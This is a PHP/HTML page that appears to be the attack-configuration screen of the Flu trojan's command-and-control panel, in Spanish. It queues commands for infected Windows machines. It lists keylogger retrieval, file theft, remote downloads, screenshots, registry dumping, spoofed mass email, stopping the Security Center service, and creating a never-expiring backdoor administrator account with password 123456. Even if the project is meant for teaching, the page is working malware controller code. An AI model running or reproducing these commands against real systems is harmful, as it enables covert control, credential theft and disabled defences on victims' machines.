<?php
//Comprobamos que existe una sesión y tiene la variable conectado, si no, redirige a la página principal
session_start();
if(empty($_SESSION['conectado']))
{
   header ("Location: index.php");
   exit;
}
error_reporting(0);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<style type="text/css">
		<!--
		@import url("css/style.css");
		-->
		body {
		  background-image: url("images/fondo.png");
		  background-color: #000000;
		  background-repeat: repeat-x;
		}
		</style>
	</head>
	<body>
	<br/><div align="center"></a><a href="http://www.flu-project.com"><img src="images/banner-servidor-web-flu.png" border="none"/></a></div><br/>
<div align="center" width="100%">
<a href="menuPrincipal.php"><img src="images/boton-menu-principal.png" border="none"/></a>
<a href="configurar-ataque.php"><img src="images/boton-configurar-ataque2.png" border="none"/></a>
<a href="configurar-claves.php"><img src="images/claves1.png" border="none"/></a>
<a href="gestionar-usuarios.php"><img src="images/user1.png" border="none"/></a>
<a href="logout.php"><img src="images/logout.png" border="none"/></a>
	</div>
		<div align="center">
			<table width="800px" height="200px" border="0px" id="gradient-style">
			<tbody>
				<tr>
					<td width="60%" style="font-weight: bold">
						Comandos manuales <img src="images/info.png" title="La consola acepta los mismos comandos de un CMD o Powershell. Además, incluye los siguientes comandos especiales:
						[getfile ruta_fichero]
						[getkeylogger]
						[downloadfile url_fichero]
						[snapshot]
						[wallpaper url_imagen]
						[getregisters]
						[killprocess nombre_proceso]
						[playaudio fichero]
						[sendmail correo_origen | pass | servidor_correo | correo_suplantado | correo_destino | asunto | mensaje | numero_correos]
						[powershell]
						" />
						<form action="saveCommands.php" method="post">
							<table><tbody>
							<tr>
							<td>
								<img src="images/cmd.gif"/>
							</td>
							<td style="vertical-align:middle">
								<input type="text" name="commands"  style="width:400px; height: 30px"/>					
							</td>
							<td style="vertical-align:middle">
								<input type="image" src="images/mas.png" name="Agregar comando" value="Agregar comando">
							</td>
							</tr>
							</tbody>
							</table>
						</form>
						Comandos preconfigurados
						<form action="saveCommands.php" method="post">
							<table><tbody>
							<tr>
							<td>
								<img src="images/preconfigurado.png"/>
							</td>
							<td style="vertical-align:middle">
								<select size="1" name="commands" style="width:400px; height: 30px">
								<option value="shutdown /s">Apagar sistema</option>
								<option value="logoff">Cerrar sesi&oacute;n</option>
								<option value="sc stop wscsvc">Detener el servicio Centro de seguridad</option>
								<option value="driverquery">Mostrar listado de drivers instalados</option>
								<option selected value="systeminfo">Mostrar informaci&oacute;n completa del sistema</option>
								<option value="getmac">Mostrar direcciones MAC de los adaptadores de red</option>
								<option value="ipconfig">Mostrar configuraciones de las interfaces de red</option>
								<option value="netstat">Mostrar listado de conexiones de red realizadas</option>
								<option value="tasklist">Mostrar listado de procesos en ejecuci&oacute;n</option>
								<option value="reg query HKLM\System\CurrentControlSet\Services\">Mostrar servicios del sistema</option>
								<option value="msg * Infectado por Flu">Mostrar mensaje de infecci&oacute;n por pantalla</option>
								<option value="net user nuevoAdministrador 123456 /add /expires:never">Crear usuario nuevoAdmin con contrase&ntilde;a 123456</option>
								<option value="net localgroup Administradores nuevoAdmin /add">Convertir usuario nuevoAdmin en administrador</option>
								<option value="net view">Listar máquinas de la red</option>								
								<option value="snapshot">Capturar pantalla</option>
								<option value="GETREGISTERS">Recuperar información del registro de Windows</option>
								<option value="GETKEYLOGGER">Recupera el archivo del keylogger</option>
								</select>
							</td>
							<td style="vertical-align:middle">
								<input type="image" src="images/mas.png" name="Agregar comando" value="Agregar comando">
							</td>
							</tr>
							</tbody>
							</table>
						</form>
					</td>
					<td width="40%" style="font-weight: bold;text-align:center">
						Vaciar el fichero XML
						<form action="eraseCommands.php" method="post">
							<input type="image" src="images/trash.png" name="Vaciar XML" value="Vaciar XML">
						</form>
					</td>
				</tr>
			</tbody>
			</table>
			<table id="gradient-style">
			<tbody>
				<tr>
					<td width="100%">
						<?php
							$archivo = file_get_contents("wee.xml");
							$archivo = str_replace("<", "&lt;", $archivo);
							$archivo = str_replace(">", "&gt;", $archivo);
							$archivo = ucfirst($archivo);
							$archivo = nl2br($archivo);
							echo "<strong>Estado actual del fichero XML de instrucciones:</strong><br/>";
							echo $archivo;
						?>
					</td>
				</tr>
			</tbody>
			</table>
		</div>
	</body>
</html>